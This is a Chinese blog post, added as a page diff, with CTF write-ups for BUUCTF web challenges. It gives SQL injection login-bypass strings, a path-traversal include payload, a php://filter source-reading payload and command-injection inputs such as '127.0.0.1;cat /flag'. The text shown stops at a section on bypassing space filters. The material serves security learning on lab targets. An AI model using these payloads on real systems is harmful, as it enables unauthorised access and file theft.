@@ -1,0 +1,393 @@
+<!DOCTYPE html><html lang="zn-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>BUUCTF Web 解题记录 | 一名网安菜鸟的学习笔记</title><meta name="author" content="xxshh"><meta name="copyright" content="xxshh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="BUUCTF Web 解题记录"><meta name="application-name" content="BUUCTF Web 解题记录"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF Web 解题记录"><meta property="og:url" content="http://example.com/2024/09/06/BUUCTF-Web-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/index.html"><meta property="og:site_name" content="一名网安菜鸟的学习笔记"><meta property="og:description" content="#[极客大挑战 2019]EasySQL首先随意输入用户名及密码，发现url变化，说明是get请求。输入1‘，判断是字符型注入还是数字型注入。发现报错，说明是字符型注入。输入万能密码：1’ or 1&amp;#x3D;1# 或者 1‘ or ’1‘&amp;#x3D;1，注意是英文字符。登录成功。 [极客大挑战 2"><meta property="og:locale" content="zn-CN"><meta property="og:image" content="https://xxshh.github.io/images/Avatar.jpg"><meta property="article:author" content="xxshh"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://xxshh.github.io/images/Avatar.jpg"><meta name="description" content="#[极客大挑战 2019]EasySQL首先随意输入用户名及密码，发现url变化，说明是get请求。输入1‘，判断是字符型注入还是数字型注入。发现报错，说明是字符型注入。输入万能密码：1’ or 1&amp;#x3D;1# 或者 1‘ or ’1‘&amp;#x3D;1，注意是英文字符。登录成功。 [极客大挑战 2"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/09/06/BUUCTF-Web-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: undefined,
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: xxshh","link":"链接: ","source":"来源: 一名网安菜鸟的学习笔记","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '一名网安菜鸟的学习笔记',
+  title: 'BUUCTF Web 解题记录',
+  postAI: '',
+  pageFillDescription: '[极客大挑战 2019]EasySQL, [极客大挑战 2019]Havefun, [HCTF 2018]WarmUp, [ACTF2020 新生赛]Include, [ACTF2020 新生赛]Exec, [GXYCTF2019]Ping Ping Ping, [SUCTF 2019]EasySQL, [强网杯 2019]随便注, [极客大挑战 2019]LoveSQL极客大挑战首先随意输入用户名及密码发现变化说明是请求输入判断是字符型注入还是数字型注入发现报错说明是字符型注入输入万能密码或者注意是英文字符登录成功极客大挑战打开靶机发现没有任何信息按下发现源代码中有一段注释对作如下改动解题成功查看源代码发现注释内容访问根据访问代码审计判断是否为字符串判断是否在白名单截取字符串将与连接返回第一次出现的位置判断是否在白名单将进行解码并重复之前的处理步骤如果在白名单中存在返回检查是否存在且为字符串类型并调用方法进行检查如果返回值为则通过语句包含指定的文件并终止程序执行否则输出一个图片标签分析代码后发现只需传入一个在白名单内的文件名并添加上问号就可以保证每次找去用于检查的内容都在白名单返回依次通过构造去查看到底是几层的根目录新生赛根据判断属于文件包含查看源代码并没有看到猜测其可能被注释利用伪协议来查看的源代码作用可以获取指定文件源码当其与文件包含函数结合时流会被当作文件执行所以一般对其进行编码阻止其不执行从而读取任意文件源代码场景知道文件地址后可以直接用该协议读取文件内容有时候一些关键字被过滤也可以用该协议绕过有的隐藏在注释当中可通过此协议查看源码获取格式构造解码得到新生赛命令注入题输入前后两条命令都会执行输入查看根目录的文件输入发现空格被过滤说明中有相关设置命令绕过空格的方法改成加其他数字貌似都行用逗号实现了空格功能需要用括起来表示也可以用发现可行这里我们发现也被过滤了的贪婪匹配匹配一个字符串中是否按顺序出现过四个字母变量替换或者注意不能按顺序出现查看题解后发现题目查询字符串的内容为查询法和语句拼接后和的结果是然后语句就成为了操作符重置法插入语句就成为是支持的基本语法校验规则其中会将认为字符串的连接符而不是或运算符这时符号就像函数一样强网杯随便注测试万能密码输出了该表的所有数据说明存在注入输入判断是否有关键字过滤函数用于执行正则表达式也就是说系统通过该代码将等关键字都过滤了联合查询报错注入布尔时间盲注就都不可以使用了只剩下堆叠注入查看数据库名查看数据表获取第一个表的表结构有两种方式方式一方式二注意如果是纯数字需要用反勾号包裹单引号或双引号是字符串的引用符号反引号是数据库表索引列和别名的引用符两者在下不区分下区分获取字段名由于关键字被过滤了所以我们可以通过预编译的方式拼接关键字预编译相当于定一个语句相同参数不同的模板名称语句名称举例查询为的用户方法一方法二方法三方法四输入注意表名加上反引号极客大挑战常规注入流程判断类型万能密码判断字段数找回显点爆数据库版本爆表爆字段解题步骤如下输入报错说明是字符型注入输入时均没有报错时报错说明表有三个字段联合查询判断回显点发现回显点是',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-10 17:35:45',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="一名网安菜鸟的学习笔记" type="application/atom+xml">
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://xxshh.github.io/images/Avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">一名网安菜鸟的学习笔记</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">BUUCTF Web 解题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-09-06T01:27:53.000Z" title="发表于 2024-09-06 09:27:53">2024-09-06</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-09-10T09:35:45.540Z" title="更新于 2024-09-10 17:35:45">2024-09-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为北京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>北京</span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/09/06/BUUCTF-Web-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"><header><h1 id="CrawlerTitle" itemprop="name headline">BUUCTF Web 解题记录</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">xxshh</span><time itemprop="dateCreated datePublished" datetime="2024-09-06T01:27:53.000Z" title="发表于 2024-09-06 09:27:53">2024-09-06</time><time itemprop="dateCreated datePublished" datetime="2024-09-10T09:35:45.540Z" title="更新于 2024-09-10 17:35:45">2024-09-10</time></header><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="#[极客大挑战 2019]EasySQL"></a>#[极客大挑战 2019]EasySQL</h1><p>首先随意输入用户名及密码，发现url变化，说明是get请求。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906102626.png"><br>输入1‘，判断是字符型注入还是数字型注入。发现报错，说明是字符型注入。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906103035.png"><br>输入万能密码：1’ or 1&#x3D;1# 或者 1‘ or ’1‘&#x3D;1，注意是英文字符。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906103357.png"><br>登录成功。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906103454.png"></p>
+<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>打开靶机，发现没有任何信息。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906103740.png"><br>按下F12，发现源代码中有一段php注释。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906104057.png">对url作如下改动，解题成功。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906104327.png"></p>
+<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>F12查看源代码，发现注释内容。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906111535.png"><br>访问source.php。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906111804.png">根据<code> $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code> 访问hint.php。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906111946.png"><br>代码审计。</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span> (! isset($page) || !is_string($page)) &#123;  <br>                echo <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span><span class="hljs-comment">;  </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><span class="hljs-comment">;  </span><br>            &#125;<br><span class="hljs-meta"># 判断$page是否为字符串</span><br><br><span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-comment">;  </span><br>            &#125;<br><span class="hljs-meta"># 判断$page是否在白名单</span><br><br> $_page = mb_substr(<br>                $page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            )<span class="hljs-comment">;</span><br><span class="hljs-meta"># mb_substr，截取字符串</span><br><span class="hljs-meta"># mb_strpos($page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)：将$page与<span class="hljs-string">&#x27;?&#x27;</span>连接，返回<span class="hljs-string">&#x27;?&#x27;</span>第一次出现的位置。</span><br><span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-comment">;  </span><br>            &#125;<br><span class="hljs-meta"># 判断$_page是否在白名单</span><br><br>$_page = urldecode($page)<span class="hljs-comment">;</span><br>            $_page = mb_substr(<br>                $_page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($_page . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            )<span class="hljs-comment">;</span><br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-comment">;</span><br>            &#125;<br><span class="hljs-meta"># 将$page进行URL解码，并重复之前的处理步骤，如果$_page在白名单中存在，返回true。</span><br><br><span class="hljs-keyword">if</span> (! empty($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])  <br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])  <br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>])  <br>    ) &#123;  <br>        include $_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>]<span class="hljs-comment">;  </span><br>        <span class="hljs-keyword">exit</span><span class="hljs-comment">;  </span><br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        echo <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;</span>https://i.loli.net/<span class="hljs-number">2018</span>/<span class="hljs-number">11</span>/<span class="hljs-number">01</span>/<span class="hljs-number">5</span>bdb0d93dc794.jpg\<span class="hljs-string">&quot; /&gt;&quot;</span><span class="hljs-comment">;  </span><br>    &#125;<br><span class="hljs-meta"># 检查$_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>]是否存在且为字符串类型，并调用emmm::checkFile方法进行检查。如果返回值为true，则通过<span class="hljs-keyword">include</span>语句包含$_REQUEST[<span class="hljs-string">&#x27;file&#x27;</span>]指定的文件并终止程序执行，否则输出一个图片标签。</span><br></code></pre></td></tr></table></figure>
+<p>分析代码后，发现只需传入一个在白名单内的文件名，并添加上问号，就可以保证每次找去用于检查的内容都在白名单，返回true。<br>依次通过…&#x2F;…&#x2F;构造payload，去查看到底是几层的根目录。<br><code>/source.php?file=source.php?/../../../../ffffllllaaaagggg</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906125139.png"></p>
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>根据url，判断属于文件包含。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906141651.png"><br>查看源代码并没有看到flag，猜测其可能被注释。利用php:&#x2F;&#x2F;filter伪协议来查看flag.php的源代码。<br> <strong>php:&#x2F;&#x2F;filter</strong>：</p>
+<ul>
+<li>作用：php:&#x2F;&#x2F;filter可以获取指定文件源码。当其与文件包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以一般对其进行编码，阻止其不执行，从而读取任意文件源代码。</li>
+<li>场景：<ul>
+<li>知道flag文件地址后，可以直接用该协议读取文件内容。</li>
+<li>有时候一些关键字被过滤也可以用该协议绕过。</li>
+<li>有的flag隐藏在注释当中，可通过此协议查看源码获取flag。</li>
+</ul>
+</li>
+<li>格式：<br> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906150746.png"><br>构造payload：file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906150933.png"><br>解码得到flag。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906151334.png"></li>
+</ul>
+<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>命令注入题<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906151944.png"><br>输入127.0.0.1；ls &#x2F;<br>；前后两条命令都会执行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906152254.png"><br>输入 127.0.0.1;cat &#x2F;flag，查看根目录的flag文件。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906152643.png"></p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>输入?ip&#x3D;127.0.0.1;ls<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906160149.png"><br>cat flag.php，发现空格被过滤。说明index.php中有相关设置。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906160424.png"><br>命令绕过空格的方法：</p>
